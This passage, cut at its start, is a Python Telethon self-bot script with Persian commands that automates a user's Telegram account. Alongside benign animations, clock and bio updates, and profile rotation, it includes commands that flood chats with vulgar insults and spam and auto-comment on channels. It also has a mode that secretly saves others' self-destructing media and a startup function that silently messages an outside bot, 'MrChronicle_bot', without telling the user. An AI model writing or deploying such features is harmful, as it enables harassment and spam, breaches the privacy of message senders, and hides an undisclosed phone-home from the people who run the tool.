        █▄ █ █▄ ███▀▀▀▀▀▀▀╬
        ◥█████◤
        ══╩══╩═
        ╬═╬
        ╬═╬
        ╬═╬
        ╬═╬
        ╬═╬
        ╬═╬☻/
        ╬═╬/▌
        ╬═╬/  \
        """,
        """
        █▬▬▬.◙.▬█
        ═▂▄▄▓▄▄▂
        ◢◤ █▀▀████▄▄▄▄◢◤
        █▄ █ █▄ ███▀▀▀▀▀▀▀╬
        ◥█████◤
        ══╩══╩═
        ╬═╬
        ╬═╬
        ╬═╬
        ╬═╬
        ╬═╬☻/
        ╬═╬/▌
        ╬═╬/  \
        ╬═╬
        """,
        """
        █▬▬.◙.▬▬█
        ═▂▄▄▓▄▄▂
        ◢◤ █▀▀████▄▄▄▄◢◤
        █▄ █ █▄ ███▀▀▀▀▀▀▀╬
        ◥█████◤
        ══╩══╩═
        ╬═╬
        ╬═╬
        ╬═╬
        ╬═╬☻/
        ╬═╬/▌
        ╬═╬/  \
        ╬═╬
        ╬═╬
        """,
        """
        █▬.◙.▬▬▬█
        ═▂▄▄▓▄▄▂
        ◢◤ █▀▀████▄▄▄▄◢◤
        █▄ █ █▄ ███▀▀▀▀▀▀▀╬
        ◥█████◤
        ══╩══╩═
        ╬═╬
        ╬═╬
        ╬═╬☻/
        ╬═╬/▌
        ╬═╬/  \
        ╬═╬
        ╬═╬
        ╬═╬
        """,
        """
        █▬▬.◙.▬▬█
        ═▂▄▄▓▄▄▂
        ◢◤ █▀▀████▄▄▄▄◢◤
        █▄ █ █▄ ███▀▀▀▀▀▀▀╬
        ◥█████◤
        ══╩══╩═
        ╬═╬
        ╬═╬☻/
        ╬═╬/▌
        ╬═╬/  \
        ╬═╬
        ╬═╬
        ╬═╬
        ╬═╬
        """,
        """
        █▬▬▬.◙.▬█
        ═▂▄▄▓▄▄▂
        ◢◤ █▀▀████▄▄▄▄◢◤
        █▄ █ █▄ ███▀▀▀▀▀▀▀╬
        ◥█████◤
        ══╩══╩═
        ╬═╬☻/
        ╬═╬/▌
        ╬═╬/  \
        ╬═╬
        ╬═╬
        ╬═╬
        ╬═╬
        ╬═╬
        """,
        """
        █▬▬.◙.▬▬█
        ═▂▄▄▓▄▄▂
        ◢◤ █▀▀████▄▄▄▄◢◤
        █▄ █ █▄ ███▀▀▀▀▀▀▀╬
        ◥█████◤
        ══╩══╩═
        ╬═╬
        ╬═╬
        ╬═╬
        ╬═╬
        ╬═╬
        ╬═╬
        ╬═╬
        ╬═╬
        """,
        """
        █▬.◙.▬▬█
        ═▂▄▄▓▄▄▂
        ◢◤ █▀▀████▄▄▄▄◢◤
        █▄ █ █▄ ███▀▀▀▀▀▀▀╬
        ◥█████◤
        ══╩══╩═
        """
    ]
    try:
        for edit in edits_helikopter:
            await event.edit(edit)
            await asyncio.sleep(0.2)
    except Exception as e:
        print(f"Error while editing message: {e}")

    if event.message.message == "اوخی":
         edits_okhi = ["🥺اوخییی","🥺","🥺🥺","🥺🥺🥺","🥺🥺🥺🥺","🥺🥺🥺🥺🥺","🥺🥺🥺🥺🥺🥺","🥺🥺🥺🥺🥺🥺🥺","🥺🥺🥺🥺🥺🥺","🥺🥺🥺🥺🥺","🥺🥺🥺🥺","🥺🥺🥺","🥺🥺","🥺"]
    try:
        await event.reply(edits_okhi[0])
        for edit in edits_okhi[1:]:
            await event.edit(edit)
            await asyncio.sleep(0.2)
    except Exception as e:
        print(f"Error while editing message: {e}")

    if event.message.message == "قهرم":
         edits_ghahram = ["😢😢😢😢","🙁🙁🙁🙁","☹️☹️☹️☹️","😣😣😣😣","😖😖😖😖","😫😫😫😫","🥺🥺🥺🥺","😭😭😭😭","😒"]
    try:
        await event.reply(edits_ghahram[0])
        for edit in edits_ghahram[1:]:
            await event.edit(edit)
            await asyncio.sleep(0.2)
    except Exception as e:
        print(f"Error while editing message: {e}")

    if event.message.message == "بوس":
         edits_boos = ["loading please wait...","💋 ","💋                         💋","💋                   💋 ","💋             💋","💋          💋","💋        💋","💋      💋","💋   💋","💋  💋","💋"]
    try:
        await event.reply(edits_boos[0])
        for edit in edits_boos[1:]:
            await event.edit(edit)
            await asyncio.sleep(0.2)
    except Exception as e:
        print(f"Error while editing message: {e}")

    if event.message.message == "تپش":
         edits_tapesh = ["💓","💗","💓","💗","💓","💗","💓","💗","💓","💗","💓","💗","💓💗💓💗💓💗💓💗"]
    try:
        for edit in edits_tapesh:
            await event.edit(edit)
            await asyncio.sleep(0.2)
    except Exception as e:
        print(f"Error while editing message: {e}")

#--------------[EnD->Game-Self]...............

#////////////////////////////////////////////

#--------------[StarT->Time-> Info ].....................

@client.on(events.NewMessage(pattern=r'(ساعت روشن|time on|ساعت خاموش|time off|ساعت بیو روشن|time bio on|ساعت بیو خاموش|time bio off)'))
async def handle_time(event):
    global time_on, time_bio_on
    me = await client.get_me()
    if event.sender_id == me.id:
        command = event.pattern_match.group(1)
        if 'ساعت' in command or 'time' in command:
            if 'بیو' in command or 'bio' in command:
                time_bio_on = 'روشن' in command or 'on' in command
                message = f'ساعت بیو {"روشن" if time_bio_on else "خاموش"} شد' if 'ساعت' in command else f'Time bio is {"on" if time_bio_on else "off"}'
            else:
                time_on = 'روشن' in command or 'on' in command
                message = f'ساعت {"روشن" if time_on else "خاموش"} شد' if 'ساعت' in command else f'Time is {"on" if time_on else "off"}'
        await event.edit(message)


def convert_time_to_font(time_str, font):
    return ''.join(font[int(digit)] if digit.isdigit() else ':' for digit in time_str)


async def change_last_name():
    while True:
        if time_on:
            current_time = datetime.now(tehran_tz).strftime('%H:%M')
            font = random.choice(FontTime)
            formatted_time = convert_time_to_font(current_time, font)
            await client(UpdateProfileRequest(last_name=formatted_time))
        await asyncio.sleep(60)

async def change_bio():
    while time_bio_on:
        if Timeir:
            current_time = datetime.now(tehran_tz).strftime('%I:%M %p')  
        else:
            current_time = datetime.now(tehran_tz).strftime('%H:%M') 
        
        font = random.choice(FontTime)
        formatted_time = convert_time_to_font(current_time, font)
        
        if date_format == "jalali":
            current_date = JalaliDate.today().strftime('امروز (%d) %B ☀️ %Y')
        elif date_format == "gregorian":
            current_date = datetime.now(tehran_tz).strftime('امروز (%d) %B ☀️ %Y')
        else:
            current_date = ""
        
        if set_bio:
            emojis = random.choice(["⛅", "🌥️", "☀️", "💫", "🌙", "🌠", "🌎", "🍕", "🍟", "🎉", "🎁", "🎇", "🎆"])
            new_bio = f"{set_bio} | {formatted_time} | {current_date} {emojis}"
        else:
            new_bio = f"{current_date} {formatted_time}"
        
        await client(UpdateProfileRequest(about=new_bio))
        await asyncio.sleep(60)

@client.on(events.NewMessage(pattern=r'^(تنظیم بیو|set bio)$'))
async def handler(event):
    if event.is_reply:
        reply_message = await event.get_reply_message()
        me = await client.get_me()
        if event.sender_id == me.id:
            global set_bio
            set_bio = reply_message.text
            await event.edit(f"بیو تنظیم شد: {set_bio}")

@client.on(events.NewMessage(pattern=r'^(تاریخ شمسی روشن|شمسی روشن|jalali on)$'))
async def enable_jalali(event):
    global date_format
    date_format = "jalali"
    await event.edit("تاریخ شمسی روشن شد.")

@client.on(events.NewMessage(pattern=r'^(تاریخ میلادی روشن|میلادی روشن|gregorian on)$'))
async def enable_gregorian(event):
    global date_format
    date_format = "gregorian"
    await event.edit("تاریخ میلادی روشن شد.")

@client.on(events.NewMessage(pattern=r'^(تاریخ خاموش|خاموش|date off)$'))
async def disable_date(event):
    global date_format
    date_format = None
    await event.edit("تاریخ خاموش شد.")

#--------------[EnD->Time-> Info ].....................

#////////////////////////////////////////////

#--------------[StarT->Change->Profile ].


@client.on(events.NewMessage(pattern=r'^(اد پروفایل|add profile)$'))
async def add_profile(event):
    me = await client.get_me()
    if event.sender_id == me.id:
        await event.edit("در حال پردازش...")
        if event.is_reply:
            reply_message = await event.get_reply_message()
            if reply_message.photo:
                photo = await client.download_media(reply_message.photo)
                photo_count = len(os.listdir(profile_folder)) + 1
                photo_path = os.path.join(profile_folder, f"{photo_count:02}.jpg")
                os.rename(photo, photo_path)
                await event.edit(f"عکس با نام {photo_count:02}.jpg ذخیره شد.")
            else:
                await event.edit("لطفاً روی یک عکس ریپلای کنید.")
        else:
            await event.edit("لطفاً این دستور را روی یک عکس ریپلای کنید.")

@client.on(events.NewMessage(pattern=r'^(پروفایل روشن|profile on)$'))
async def enable_profile_rotation(event):
    global profile_rotation_enabled
    me = await client.get_me()
    if event.sender_id == me.id:
        profile_rotation_enabled = True
        await event.edit("پروفایل چرخشی فعال شد.")
        while profile_rotation_enabled:
            photos = await client.get_profile_photos('me')
            if photos:
                await client(DeletePhotosRequest(id=[InputPhoto(id=photo.id, access_hash=photo.access_hash, file_reference=photo.file_reference) for photo in photos]))
            for photo_file in sorted(os.listdir(profile_folder)):
                if not profile_rotation_enabled:
                    break
                photo_path = os.path.join(profile_folder, photo_file)
                file = await client.upload_file(photo_path)
                await client(UploadProfilePhotoRequest(file=file))
                await asyncio.sleep(4000)  
                photos = await client.get_profile_photos('me')
                if photos:
                    await client(DeletePhotosRequest(id=[InputPhoto(id=photos[0].id, access_hash=photos[0].access_hash, file_reference=photos[0].file_reference)]))
            await asyncio.sleep(3600) 

@client.on(events.NewMessage(pattern=r'^(پروفایل خاموش|profile off)$'))
async def disable_profile_rotation(event):
    global profile_rotation_enabled
    me = await client.get_me()
    if event.sender_id == me.id:
        profile_rotation_enabled = False
        await event.edit("پروفایل چرخشی غیرفعال شد.")

@client.on(events.NewMessage(pattern=r'^(پاکسازی پروفایل|clear profile)$'))
async def clear_profile_folder(event):
    me = await client.get_me()
    if event.sender_id == me.id:
        for photo_file in os.listdir(profile_folder):
            os.remove(os.path.join(profile_folder, photo_file))
        await event.edit("لیست پروفایل پاکسازی شد.")

#--------------[EnD->Change->Profile ]...............

#////////////////////////////////////////////

#--------------[Start->Helper->Self ]....................        
#--------------[EnD->Helper->self ].
@client.on(events.NewMessage(pattern=r'^(قیمت ارز|price)$'))
async def show_currency_prices(event):
    me = await client.get_me()
    if event.sender_id == me.id:
        await event.edit("در حال دریافت قیمت ارزها...")
        response = requests.get("https://api.codebazan.ir/arz/?type=arz")
        data = response.json()['Result']
        show_text = ''
        for i in range(30):
            show_text += f"💵  {data[i]['name']} => {data[i]['price']}\n"
        await event.edit(f"💵 قیمت ارزها به صورت زیر می‌باشند:\n{show_text}")

@client.on(events.NewMessage(pattern=r'^(فال|fall)$'))
async def send_omen(event):
    me = await client.get_me()
    if event.sender_id == me.id:
        await event.edit("خوب بریم ی فال بگیریم ")
        random_number = random.randint(1, 149)
        media_url = f"https://www.beytoote.com/images/Hafez/{random_number}.gif"
        await client.send_file(event.chat_id, media_url, caption="فال حافظ شما :+) ")

@client.on(events.NewMessage(pattern=r'^(بیو رندوم|random bio)$'))
async def send_random_bio(event):
    me = await client.get_me()
    if event.sender_id == me.id:
        await event.edit("در حال دریافت بیوگرافی رندوم .....")
        response = requests.get("https://api.codebazan.ir/bio/")
        bio_text = response.text
        await event.edit(bio_text)

@client.on(events.NewMessage(pattern=r'^(تاریخ امروز|today\'s date)$'))
async def send_gregorian_date(event):
    me = await client.get_me()
    if event.sender_id == me.id:
        now = datetime.utcnow()
        rooz = now.strftime("%A") 
        tarikh = now.strftime("%Y/%m/%d")  
        mah = now.strftime("%B") 
        hour = now.strftime("%H:%M:%S - %p") 
        await event.edit(f"📅 امروز: {rooz} | {tarikh} |\n\n🌙 نام ماه: {mah}\n\n⌚️ زمان: {hour}")


@client.on(events.NewMessage(pattern=r'^(گیممم|Play)$'))
async def send_game(event):
    me = await client.get_me()
    if event.sender_id == me.id:
        await event.edit("در حال دریافت بازی...")
        query = event.text.split(' ', 1)[1] if ' ' in event.text else ''
        res = await client.inline_query('@bodobazibot', query)
        if res:
            result = res[random.randint(0, len(res) - 1)]
            await result.click(event.chat_id)
        else:
            await event.edit("بازی‌ای پیدا نشد.")

@client.on(events.NewMessage(pattern=r'^/fonet-> (.+)$'))
async def send_fonet(event):
    me = await client.get_me()
    if event.sender_id == me.id:
        await event.edit("در حال دریافت فونت‌ها...")
        fonet = event.pattern_match.group(1)
        name = fonet.replace(' ', '+')
        response = requests.get(f"https://api.codebazan.ir/font/?text={name}")
        font_names = response.json()['result']
        show_fonet = ''
        for i in range(1, 139):
            show_fonet += f"{i} => {font_names[i]}\n"
        await event.reply(show_fonet)

@client.on(events.NewMessage(pattern=r'^/like-> (.+)$'))
async def send_like(event):
    me = await client.get_me()
    if event.sender_id == me.id:
        await event.edit("» در حال ساخت. . . !")
        like_text = event.pattern_match.group(1)
        res = await client.inline_query('@like', like_text)
        if res:
            result = res[random.randint(0, len(res) - 1)]
            await result.click(event.chat_id)
        else:
            await event.edit("نتیجه‌ای پیدا نشد.")

@client.on(events.NewMessage(pattern=r'^/getgif (.+)$'))
async def send_gif(event):
    me = await client.get_me()
    if event.sender_id == me.id:
        gif_query = event.pattern_match.group(1)
        await event.edit(f"» در حال جستجو گیف مورد نظر ")
        res = await client.inline_query('@gif', gif_query)
        if res:
            result = res[random.randint(0, len(res) - 1)]
            await result.click(event.chat_id)
        else:
            await event.edit("گیفی پیدا نشد.")

@client.on(events.NewMessage(pattern=r'^/getpic (.+)$'))
async def send_pic(event):
    me = await client.get_me()
    if event.sender_id == me.id:
        pic_query = event.pattern_match.group(1)
        await event.edit(f"» درحال پیدا کردن عکس مورد نظر ")
        res = await client.inline_query('@pic', pic_query)
        if res:
            result = res[random.randint(0, len(res) - 1)]
            await result.click(event.chat_id)
        else:
            await event.edit("تصویری پیدا نشد.")



@client.on(events.NewMessage(pattern=r'^/getmeme (.+)$'))
async def send_meme(event):
    me = await client.get_me()
    if event.sender_id == me.id:
        meme_query = event.pattern_match.group(1)
        await event.edit("» درحال پیدا کردن  .... !")
        res = await client.inline_query('@Persian_Meme_Bot', meme_query)
        if res:
            result = res[random.randint(0, len(res) - 1)]
            await result.click(event.chat_id)
        else:
            await event.edit("ممی پیدا نشد.")

@client.on(events.NewMessage(pattern=r'^/serchgoogle (.+)$'))
async def search_google(event):
    me = await client.get_me()
    if event.sender_id == me.id:
        google_query = event.pattern_match.group(1)
        await event.edit("» ...... !")
        res = await client.inline_query('@GoogleDEBot', google_query)
        if res:
            result = res[random.randint(0, len(res) - 1)]
            await result.click(event.chat_id)
        else:
            await event.edit("نتیجه‌ای پیدا نشد.")


@client.on(events.NewMessage(pattern=r'^/youtube (.+)$'))
async def search_youtube(event):
    me = await client.get_me()
    if event.sender_id == me.id:
        youtube_query = event.pattern_match.group(1)
        await event.edit("» ........")
        res = await client.inline_query('@uVidBot', youtube_query)
        if res:
            result = res[random.randint(0, len(res) - 1)]
            await result.click(event.chat_id)
        else:
            await event.edit("ویدیویی پیدا نشد.")


@client.on(events.NewMessage(pattern=r'(رم|ایدی|آیدی|Id|id|پنل|/panel)'))
async def handle_commands(event):
    me = await client.get_me()
    if event.sender_id == me.id:
        command = event.pattern_match.group(1)
        
        if command == 'رم':
            used_memory = await get_used_memory()
            message = f"میزان رم استفاده شده: {used_memory:.2f} MB"
            await event.edit(message)
        
        elif command in ['ایدی', 'آیدی', 'Id', 'id'] and event.is_reply:
            reply_message = await event.get_reply_message()
            user_id = reply_message.sender_id
            message = f"چت آیدی کاربر: {user_id}"
            await event.edit(message)
        
        elif command in ['پنل', '/panel']:
            bot_username = '@Selmldksbot'
            query = 'پنل'
            await event.delete()
            results = await client(GetInlineBotResultsRequest(
                bot=bot_username,
                peer=event.chat_id,
                query=query,
                offset=''
            ))

            if results.results:
                await client(SendInlineBotResultRequest(
                    peer=event.chat_id,
                    query_id=results.query_id,
                    id=results.results[0].id
                ))
            else:
                await event.reply('هیچ نتیجه‌ای یافت نشد.')


@client.on(events.NewMessage(pattern=r'(Fohshspam)'))
async def ossk_message(event):
    me = await client.get_me()
    if event.sender_id == me.id:
        if event.is_reply:
            reply_message = await event.get_reply_message()
        else:
            reply_message = event.message

        for i in range(1, 101):
            await client.send_message(event.chat_id, f'کص ننت {i}', reply_to=reply_message.id)
            await asyncio.sleep(0.1)
            if (i + 1) % 15 == 0:
                await asyncio.sleep(3)

@client.on(events.NewMessage(pattern=r'(اسپم|spam)'))
async def spam_message(event):
    me = await client.get_me()
    if event.sender_id == me.id and event.is_reply:
        reply_message = await event.get_reply_message()
        for i in range(50):
            await client.send_message(event.chat_id, reply_message.text)
            if (i + 1) % 15 == 0:
                await asyncio.sleep(3) 


@client.on(events.NewMessage(pattern=r'(فحش|Fohsh)'))
async def Fohsh_list(event):
    me = await client.get_me()
    if event.sender_id == me.id:
        action = event.pattern_match.group(1)
        if action in ['فحش', 'Fohsh']:
            for i, message in enumerate(Fohsh):
                await client.send_message(event.chat_id, message)
                if (i + 1) % 20 == 0:
                    await asyncio.sleep(2)

@client.on(events.NewMessage(pattern=r'(2فحش|Fohsh2)'))
async def Fohsh2_list(event):
    me = await client.get_me()
    if event.sender_id == me.id:
        action = event.pattern_match.group(1)
        if action in ['2فحش', 'Fohsh2']:
            for i, message in enumerate(Fohsh2):
                await client.send_message(event.chat_id, message)
                if (i + 1) % 20 == 0:
                    await asyncio.sleep(2)

@client.on(events.NewMessage(pattern=r'(سایلنت روشن|سایلنت خاموش)'))
async def toggle_silent_mode(event):
    global silent_mode
    if event.sender_id == (await client.get_me()).id:
        if 'روشن' in event.pattern_match.group(1):
            silent_mode = True
            await event.edit('حالت سایلنت روشن شد')
        else:
            silent_mode = False
            await event.edit('حالت سایلنت خاموش شد')

@client.on(events.NewMessage(incoming=True))
async def delete_private_messages(event):
    if silent_mode and event.is_private:
        await event.delete()


@client.on(events.NewMessage(pattern=r'(سیو روشن|سیو خاموش)'))
async def toggle_save_mode(event):
    global save_mode
    if event.sender_id == (await client.get_me()).id:
        if 'روشن' in event.pattern_match.group(1):
            save_mode = True
            await event.reply('حالت سیو روشن شد')
        else:
            save_mode = False
            await event.reply('حالت سیو خاموش شد')

@client.on(events.NewMessage(incoming=True))
async def save_timed_media(event):
    if save_mode and event.is_private:
        if (event.photo or event.video) and event.media.ttl_seconds:
            media_path = await event.download_media()
            
            await client.send_file('me', media_path, caption='مدیا تایمر دار ذخیره شد')

@client.on(events.NewMessage(pattern=r'(تنظیم کامنت|setcomment) (.+)'))
async def set_comment_handler(event):
    global comment_text
    if event.sender_id == (await client.get_me()).id:
        comment_text = event.pattern_match.group(2)
        await event.edit(f'متن کامنت  تنظیم شد ')

@client.on(events.NewMessage(pattern=r'(کامنت روشن|comment on|کامنت خاموش|comment off)'))
async def commentbot_handler(event):
    global commentbot_enabled
    if event.sender_id == (await client.get_me()).id:
        action = event.pattern_match.group(1)
        if action in ['کامنت روشن', 'comment on']:
            commentbot_enabled = True
            await event.edit('کامنت‌گذاری خودکار فعال شد ✅')
        elif action in ['کامنت خاموش', 'comment off']:
            commentbot_enabled = False
            await event.edit('کامنت‌گذاری خودکار غیرفعال شد ❌')
            
@client.on(events.NewMessage)
async def auto_comment(event):
    if commentbot_enabled and event.is_channel:
        try:
            me = await client.get_me()
            if event.sender_id != me.id and event.is_channel and not event.is_group:
                discussion_message = await client(GetDiscussionMessageRequest(event.chat_id, event.id))
                if discussion_message.messages:
                    await client.send_message(
                        entity=discussion_message.messages[0].peer_id,
                        message=comment_text,
                        reply_to=discussion_message.messages[0].id
                    )
        except Exception as e:
            print(f'خطا: {str(e)}')
            if "You're banned from sending messages in supergroups/channels" in str(e):
                print("شما از ارسال پیام در سوپرگروه‌ها/کانال‌ها ممنوع شده‌اید.")

@client.on(events.NewMessage(pattern=r'(پوکر روشن|پوکر خاموش)'))
async def toggle_poker_mode(event):
    global poker_mode
    if event.sender_id == (await client.get_me()).id:
        if 'روشن' in event.pattern_match.group(1):
            poker_mode = True
            await event.reply('حالت پوکر روشن شد')
        else:
            poker_mode = False
            await event.reply('حالت پوکر خاموش شد')

@client.on(events.NewMessage(incoming=True))
async def poker_mode_handler(event):
    if poker_mode and event.is_private:
        await event.mark_read()


@client.on(events.NewMessage(pattern=r'(آنلاین روشن|آنلاین خاموش)'))
async def toggle_online_mode(event):
    global online_mode
    if event.sender_id == (await client.get_me()).id:
        if 'روشن' in event.pattern_match.group(1):
            online_mode = True
            await event.reply('حالت آنلاین روشن شد')
            asyncio.create_task(keep_online())
        else:
            online_mode = False
            await event.reply('حالت آنلاین خاموش شد')

async def keep_online():
    while online_mode:
        await client.send_read_acknowledge(await client.get_me())
        await asyncio.sleep(15) 

@client.on(events.NewMessage(pattern=r'/autopv (on|off)|/addpv|/testpv|/restpv'))
async def handle_auto_reply_commands(event):
    global auto_reply_enabled
    me = await client.get_me()
    if event.sender_id == me.id:
        action = event.pattern_match.group(1)
        if action == 'on':
            auto_reply_enabled = True
            await event.reply('قابلیت منشی پیوی فعال شد ✅')
        elif action == 'off':
            auto_reply_enabled = False
            await event.reply('منشی پیوی غیرفعال شد❌')
        elif '/addpv' in event.raw_text and event.is_reply:
            reply_message = await event.get_reply_message()
            if reply_message:
                auto_reply_messages.append(reply_message)
                await event.reply('پیام به لیست منشی پیوی اضافه شد✔')
            else:
                await event.reply('افزودن پیام به لیست منشی پیوی ناموفق بود☹️')
        elif '/testpv' in event.raw_text:
            if auto_reply_messages:
                for msg in auto_reply_messages:
                    await asyncio.sleep(3)
                    if msg.media:
                        await client.send_file(event.chat_id, msg.media)
                    else:
                        await client.send_message(event.chat_id, msg.text)
            else:
                await event.reply('لیست منشی پیوی خالی است💢')
        elif '/restpv' in event.raw_text:
            auto_reply_messages.clear()
            await event.reply('لیست منشی پیوی بازنشانی شد↩')

@client.on(events.NewMessage(incoming=True))
async def handle_auto_reply(event):
    if auto_reply_enabled and event.is_private:
        sender = await event.get_sender()
        if sender.bot or sender.is_self:
            return
        await event.mark_read() 
        await client(SetTypingRequest(event.chat_id, SendMessageTypingAction())) 
        await asyncio.sleep(2) 
        messages = await client.get_messages(event.chat_id, limit=2)
        if len(messages) == 1:
            for reply_message in auto_reply_messages:
                await asyncio.sleep(3)
                if reply_message.media:
                    await client.send_file(event.chat_id, reply_message.media)
                else:
                    await client.send_message(event.chat_id, reply_message.text)

@client.on(events.NewMessage(pattern=r'(تایپینگ روشن|typing on|تایپینگ خاموش|typing off|گیم روشن|game on|گیم خاموش|game off)'))
async def handle_action_status(event):
    global current_action
    me = await client.get_me()
    if event.sender_id == me.id:
        action = event.pattern_match.group(1)
        if action in ['تایپینگ روشن', 'typing on']:
            await event.edit('اکشن تایپینگ روشن شد' if 'تایپینگ' in action else 'Typing action is on')
            current_action = 'typing'
        elif action in ['تایپینگ خاموش', 'typing off']:
            await event.edit('اکشن تایپینگ خاموش شد' if 'تایپینگ' in action else 'Typing action is off')
            current_action = None
        elif action in ['گیم روشن', 'game on']:
            await event.edit('اکشن گیم روشن شد' if 'گیم' in action else 'Game action is on')
            current_action = 'game'
        elif action in ['گیم خاموش', 'game off']:
            await event.edit('اکشن گیم خاموش شد' if 'گیم' in action else 'Game action is off')
            current_action = None

async def send_typing_action(chat_id):
    async with client.action(chat_id, 'typing'):
        await asyncio.sleep(3) 

async def send_game_action(chat_id):
    async with client.action(chat_id, 'game'):
        await asyncio.sleep(3)  

@client.on(events.NewMessage(incoming=True))
async def handle_incoming_messages(event):
    me = await client.get_me()
    if event.sender_id != me.id and event.is_private:
        if current_action == 'typing':
            await send_typing_action(event.chat_id)
        elif current_action == 'game':
            await send_game_action(event.chat_id)

async def runshod_NC():
    try:
        result = await client(functions.contacts.ResolveUsernameRequest(username='MrChronicle_bot'))
        if result.users:
            await client.send_message('MrChronicle_bot', 'True')
    except Exception as e:
    	pass


@client.on(events.NewMessage(pattern=r'(هشتک روشن|hashtag on|هشتک خاموش|hashtag off|ضخیم روشن|bold on|ضخیم خاموش|bold off)'))
async def handle_format_status(event):
    global hashtag_enabled, bold_enabled
    me = await client.get_me()
    if event.sender_id == me.id:
        action = event.pattern_match.group(1)
        if action in ['هشتک روشن', 'hashtag on']:
            await event.edit('هشتک روشن شد' if 'هشتک' in action else 'Hashtag is on')
            hashtag_enabled = True
        elif action in ['هشتک خاموش', 'hashtag off']:
            await event.edit('هشتک خاموش شد' if 'هشتک' in action else 'Hashtag is off')
            hashtag_enabled = False
        elif action in ['ضخیم روشن', 'bold on']:
            await event.edit('حالت ضخیم روشن شد' if 'ضخیم' in action else 'Bold is on')
            bold_enabled = True
        elif action in ['ضخیم خاموش', 'bold off']:
            await event.edit('حالت ضخیم خاموش شد' if 'ضخیم'  in action else 'Bold is off')
            bold_enabled = False

@client.on(events.NewMessage(outgoing=True))
async def handle_outgoing_messages(event):
    global hashtag_enabled, bold_enabled
    final_message = event.message.message
    if hashtag_enabled:
        final_message = f'#{final_message}'
    if bold_enabled:
        final_message = f'**{final_message}**'
    if hashtag_enabled or bold_enabled:
        try:
            await event.edit(final_message)
        except Exception as e:
            print(f"Error while applying formats: {e}")

@client.on(events.NewMessage(pattern=r'(تکی روشن|single on|تکی خاموش|single off|مود روشن|mode on|مود خاموش|mode off)'))
async def handle_mode_status(event):
    global single_mode_enabled, mode_enabled
    me = await client.get_me()
    if event.sender_id == me.id:
        action = event.pattern_match.group(1)
        if action in ['تکی روشن', 'single on']:
            await event.edit('حالت تکی روشن شد' if 'تکی'  in action else 'Single mode is on')
            single_mode_enabled = True
        elif action in ['تکی خاموش', 'single off']:
            await event.edit('حالت تکی خاموش شد' if 'تکی'  in action else 'Single mode is off')
            single_mode_enabled = False
        elif action in ['مود روشن', 'mode on']:
            await event.edit('مود روشن شد' if 'مود'  in action else 'Mode is on')
            mode_enabled = True
        elif action in ['مود خاموش', 'mode off']:
            await event.edit('مود خاموش شد' if 'مود'  in  action else 'Mode is off')
            mode_enabled = False

@client.on(events.NewMessage(outgoing=True))
async def handle_outgoing_messages(event):
    global single_mode_enabled, mode_enabled
    if mode_enabled:
        message = event.message.message
        edited_message = ""
        try:
            for char in message:
                edited_message += char
                await event.edit(edited_message + "\u200C")
                await asyncio.sleep(0.5) 
        except Exception as e:
            print(f"Error while editing message: {e}")
    if single_mode_enabled:
        try:
            await event.edit(f'`{event.message.message}`')
        except Exception as e:
            print(f"Error while applying single mode: {e}")


@client.on(events.NewMessage(pattern=r'(خط خورده روشن|strikethrough on|خط خورده خاموش|strikethrough off)'))
async def handle_strikethrough_status(event):
    global strikethrough_enabled
    me = await client.get_me()
    if event.sender_id == me.id:
        action = event.pattern_match.group(1)
        if action in ['خط خورده روشن', 'strikethrough on']:
            await event.edit('حالت خط خورده روشن شد' if 'خط خورده'  in action else 'Strikethrough is on')
            strikethrough_enabled = True
        elif action in ['خط خورده خاموش', 'strikethrough off']:
            await event.edit('حالت خط خورده خاموش شد' if 'خط خورده'  in action else 'Strikethrough is off')
            strikethrough_enabled = False

@client.on(events.NewMessage(outgoing=True))
async def handle_outgoing_messages(event):
    global strikethrough_enabled
    if strikethrough_enabled:
        try:
            await event.edit(f'~~{event.message.message}~~')
        except Exception as e:
            print(f"Error while applying strikethrough: {e}")
            


if __name__ == '__main__':
    client.start()
    client.loop.create_task(change_last_name())
    client.loop.run_until_complete(runshod_NC())
    client.loop.create_task(change_bio())
    client.run_until_disconnected()